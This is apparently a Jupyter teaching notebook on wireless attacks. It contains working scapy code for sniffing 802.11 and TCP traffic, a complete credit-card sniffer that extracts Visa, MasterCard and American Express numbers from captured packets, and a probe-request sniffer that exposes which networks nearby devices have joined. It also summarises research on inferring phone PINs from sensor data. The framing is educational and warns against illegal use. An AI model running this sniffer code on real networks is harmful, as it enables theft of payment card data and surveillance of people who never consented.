{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Wireless Mayhem\n",
    "===\n",
    "On September 5, 2007, the US Secret Service arrested a wireless hacker named Max Ray Butler (Secret Service, 2007). Also known as the `Iceman`, Mr. Butler sold tens of thousands of credit card accounts through a Website. But how did he collect this private information? Sniffing unencrypted wireless Internet connections proved to be one of the methods he used to gain access to credit card information. The Iceman rented hotel rooms and apartments using false identities. He then used high-power antennae to intercept communications to the hotel’s and nearby apartments’ wireless access points to capture the personal information of its guests (Peretti, 2009). All too often, media experts classify this type of attack “sophisticated and complex.” Such a statement proves dangerous, as we can execute several of these attacks in short Python scripts. As you’ll see in the following sections, we can sniff for credit card information in less than 25 lines of code. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from IPython.display import IFrame\n",
    "\n",
    "IFrame(src='https://127.0.0.1:8888/',width='80%',height='400pt')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Wireless Environment\n",
    "---\n",
    "Here, we will write code to sniff wireless traffic and send raw 802.11  frames."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Device for wireless network in Mac\n",
    "!ifconfig en0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Device for wireless network in Mac\n",
    "---\n",
    "```\n",
    "en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500\n",
    "\tether ff:ff:ff:ff:ff:ff \n",
    "\tinet6 fe80::2acf:e9ff:fe20:ef4d%en0 prefixlen 64 scopeid 0x4 \n",
    "\tinet 192.168.11.7 netmask 0xffffff00 broadcast 192.168.11.255\n",
    "\tnd6 options=1<PERFORMNUD>\n",
    "\tmedia: autoselect\n",
    "\tstatus: active\n",
    "```    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Device for wireless network in Mac while no connect\n",
    "!ifconfig en0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Device for wireless network in Mac while no connect\n",
    "--\n",
    "```\n",
    "en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500\n",
    "\tether ff:ff:ff:ff:ff:ff  \n",
    "\tnd6 options=201<PERFORMNUD,DAD>\n",
    "\tmedia: autoselect (<unknown type>)\n",
    "\tstatus: inactive\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Device for wireless network in Linux\n",
    "!ifconfig eth0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!iwconfig eth0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Device for wireless network in Linux\n",
    "---\n",
    "```\n",
    "eth0      IEEE 802.11abg  ESSID:\"xxxxxxx\"  \n",
    "          Mode:Managed  Frequency:5.32 GHz  Access Point: ff:ff:ff:ff:ff:ff    \n",
    "          Bit Rate=54 Mb/s   Tx-Power=200 dBm   \n",
    "          Retry short limit:7   RTS thr:off   Fragment thr:off\n",
    "          Encryption key:off\n",
    "          Power Management:off\n",
    "          Link Quality=54/70  Signal level=-56 dBm  \n",
    "          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0\n",
    "          Tx excessive retries:0  Invalid misc:0   Missed beacon:0\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Packets Retrieving\n",
    "---\n",
    "By <a href=\"www.tcpdump.org\">tcpdump</a>, we can get packcets from internet and analyze them.\n",
    "On Mac box, we could\n",
    "- monitor the network flow where user travel:\n",
    "```\n",
    "sudo tcpdump -i en0 \n",
    "```\n",
    "where <font color=\"green\">en0</font> is the recognized ethercard within Mac system;\n",
    "- retrieve and save it into file:\n",
    "```\n",
    "sudo tcpdump -i en0 -s 0 -B 524288 -w DumpFile01.pcap\n",
    "```\n",
    "where  <font color=\"green\">DumpFile01.pcap</font> is the file for data saved.\n",
    "- or observe data:\n",
    "```\n",
    "tcpdump -s 0 -n -e -x -vvv -r DumpFile01.pcap\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import logging\n",
    "logging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\n",
    "from scapy.all import *\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# define the ethernetcard device here\n",
    "ethernetcard='en0'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def pktPrint(pkt):\n",
    "    if pkt.haslayer(Dot11Beacon):\n",
    "        print('[+] Detected 802.11 Beacon Frame')\n",
    "    elif pkt.haslayer(Dot11ProbeReq):\n",
    "        print('[+] Detected 802.11 Probe Request Frame')\n",
    "    elif pkt.haslayer(TCP):\n",
    "        print('[+] Detected a TCP Packet')\n",
    "        exit(0)\n",
    "    elif pkt.haslayer(DNS):\n",
    "        print('[+] Detected a DNS Packet')\n",
    "\n",
    "\n",
    "conf.iface = ethernetcard\n",
    "sniff(prn=pktPrint)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Output\n",
    "---\n",
    "```\n",
    "[+] Detected a TCP Packet\n",
    "...\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Additionally, we will need access to a Bluetooth device. To test if \n",
    "this operating system recognizes the device, run the \n",
    "command, `hciconfig`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! hciconfig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Using Python Regular Expressions to Sniff Credit Cards\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Regular Expressions \n",
    "---\n",
    "\n",
    "- The Visa regular expression begins with 4, followed by 12 more digits. We will accept either 0 or 1 cases of 3 more digits to ensure we have either 13 or 16 digits total in length:\n",
    "```\n",
    "4: begin with 4;\n",
    "[0-9]{12}: followed 12 digits;\n",
    "(?:[0-9]{3})?: 0 or 1 3-digits at the end.\n",
    "```\n",
    "where\n",
    "```\n",
    "[type of digits]\n",
    "{length of digits}\n",
    "```\n",
    "- MasterCard regular expression matches the number 5, followed by 1 through 5, followed by 14 digits, for a total of 16 digits in length.\n",
    "- American Express begins with 3, followed by either a 4 or 7; next, the regular expression matches13 more digits to ensure a total length of 15 digits."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "def findCreditCard(raw):\n",
    "    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)\n",
    "    if visaRE:\n",
    "        print('[+] Found Visa Card: ' + visaRE[0])\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Found Visa Card: 4123456789012123\n"
     ]
    }
   ],
   "source": [
    "tests = []\n",
    "tests.append('I would like to buy 1337 copies of that dvd') \n",
    "tests.append('Bill my card: 4123456789012123 for \\$2600') \n",
    "for test in tests:\n",
    "    findCreditCard(test)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now put them together, \n",
    "<div align=\"center\">\n",
    "<font color=\"red\"><b>DON't DO IT ILLEGALLY!</b></font>\n",
    "</div>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "\n",
    "from scapy.all import *\n",
    "interface='eth0'\n",
    "\n",
    "def findCreditCard(pkt):\n",
    "    raw = pkt.sprintf('%Raw.load%')\n",
    "    americaRE = re.findall('3[47][0-9]{13}', raw)\n",
    "    masterRE = re.findall('5[1-5][0-9]{14}', raw)\n",
    "    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)\n",
    "\n",
    "    if americaRE:\n",
    "        print('[+] Found American Express Card: ' + americaRE[0])\n",
    "    if masterRE:\n",
    "        print('[+] Found MasterCard Card: ' + masterRE[0])\n",
    "    if visaRE:\n",
    "        print('[+] Found Visa Card: ' + visaRE[0])\n",
    "\n",
    "\n",
    "def main(interface):\n",
    "    if interface == None:\n",
    "        print('input device name')\n",
    "        exit(0)\n",
    "    else:\n",
    "        conf.iface = interface\n",
    "    try:\n",
    "        print('[*] Starting Credit Card Sniffer.')\n",
    "        sniff(filter='tcp', prn=findCreditCard, store=0)\n",
    "    except KeyboardInterrupt:\n",
    "        exit(0)\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Obviously, we do not intend not for anybody to steal credit card data. In fact, this very attack landed a wireless hacker and thief named `Albert Gonzalez` in jail for over twenty years. But hopefully you realize this attack is relatively sim- ple and not as sophisticated as generally believed."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "WHERE HAS YOUR Mobile device BEEN?\n",
    "---\n",
    "In an attempt to provide seamless connectivity, your mobile device, computer or phone, often keeps a preferred network list, which contains the names of wireless networks you have successfully connected to in the past. Either when your computer boots up or after disconnecting from a network, your computer frequently sends 802.11 Probe Requests to search for each of the network names on that list.\n",
    "\n",
    "The following simple snippet, sniffProbe(), created to  detect 802.11 probe requests com from nearby. It will sort out\n",
    "only 802.11 Probe Requests by asking the packet if it owns <i>haslayer(Dot11ProbeReq)</i>. If the request contains a new network name, we can print the network name to the screen."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "\n",
    "interface = 'en0' \n",
    "probeReqs = []\n",
    "\n",
    "\n",
    "def sniffProbe(p):\n",
    "    if p.haslayer(Dot11ProbeReq):\n",
    "        netName = p.getlayer(Dot11ProbeReq).info\n",
    "        if netName not in probeReqs:\n",
    "            probeReqs.append(netName)\n",
    "            print('[+] Detected New Probe Request: ' + netName)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "sniff(iface=interface, prn=sniffProbe)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "Recent Reports\n",
    "===\n",
    "Malicious accessing Cell Phones\n",
    "---\n",
    "1. 2017/September, Princeton researchers silently collected data from a phone's sensors to successfully infer a user's geographical location without asking the test subject for permission to access his phone's GPS tracking component.\n",
    "\n",
    "-  2017/April, scientists from the University of Newcastle in the UK created a JavaScript file that could be embedded in web pages or malicious apps and could silently log sensor data to train a similar algorithm that can guess PINs and passwords.\n",
    "- 2017/December, Team of Nanyang Technological University (NTU) in Singapore published its paper [There Goes Your PIN: Exploiting Smartphone Sensor Fusion Under Single and Cross User Setting].\n",
    "       \n",
    "        The three scientists behind this work are only the most recent group of researchers that have noticed a glaring security hole in the design of modern mobile operating systems such as Android and iOS.\n",
    "\n",
    "        Researchers say that these operating systems do not require apps to ask users for permissions before accessing sensor data.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Sensors provide unique data fingerprint for each key tap\n",
    "---\n",
    "\n",
    "NTU team created an Android app that they installed on test devices that silently collected data from six sensors: accelerometer, gyroscope, magnetometer, proximity sensor, barometer, and ambient light sensor.\n",
    "\n",
    "The algorithm analyzed the collected sensor data and was able to distinguish between presses on different keys by looking at device tilt (space and angle-related coordinates) and nearby ambient light whenever the user moved his finger over the phone's touchscreen to enter the PIN and unlocked the device.\n",
    "\n",
    "During their experiment, the research team used sensor data only from 500 random PIN-entry operations supplied by three candidates, meaning the algorithm could become more accurate as it collected more data.\n",
    "\n",
    "Based on the research team's samples, the algorithm was able to guess a PIN code with a 99.5% accuracy on the first try using PINs from a list of the 50 most common PIN numbers. Previous research had a success rate of 74% using the same list of the 50 most common PIN numbers, the research team said.\n",
    "\n",
    "The success rate went down from 99.5% to 83.7% when researchers tried to guess all 10,000 possible combinations of four-digit PINs within 20 tries.\n",
    "\n",
    "\"Moreover, with the underlying agile methodology, the technique can be easily scaled up to longer PINs,\" researchers said."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
